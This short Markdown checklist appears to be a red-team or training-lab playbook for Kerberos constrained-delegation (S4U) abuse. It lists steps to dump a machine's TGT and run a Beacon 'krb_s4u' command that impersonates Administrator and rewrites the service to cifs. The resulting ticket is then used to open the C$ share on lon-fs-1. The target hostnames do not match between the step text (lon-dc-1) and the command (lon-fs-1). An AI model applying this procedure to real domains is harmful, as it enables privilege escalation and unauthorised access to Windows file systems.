## Exploitation

1. [ ] Dump the TGT for the target machine.
1. [ ] Perform the S4U abuse to obtain a usable service ticket for *time/lon-dc-1*, substituting the service name for *cifs*.
  
    ```Beacon-nocolor
    krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
    ```

1. [ ] Leverage the ticket to access the C$ share on *lon-fs-1*.
